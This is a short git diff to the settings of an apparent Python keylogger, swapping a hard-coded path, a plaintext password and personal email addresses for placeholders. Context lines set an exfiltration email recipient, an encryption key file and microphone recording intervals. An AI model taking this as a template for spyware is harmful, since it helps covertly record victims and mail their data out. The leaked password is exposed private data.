@@ -38,14 +38,14 @@ key_file = open("..\\Cryptography\\encryption_key.txt")
 enc_key = key_file.read()
 key_file.close()
 
-file_path = "C:\\Users\\user\\Desktop\\Keylogger\\Project"
+file_path = "..\\Keylogger\\Project"
 extend = "\\"
 file_merge = file_path + extend
 
-email = ""
-password = "deepak@1"
+email = "Your_Email"
+password = "Your_Password"
 
-toaddress = "deepakkumarjha178531@gmail.com"
+toaddress = "To_Email"
 
 microphone_time = 10
 time_iteration = 15
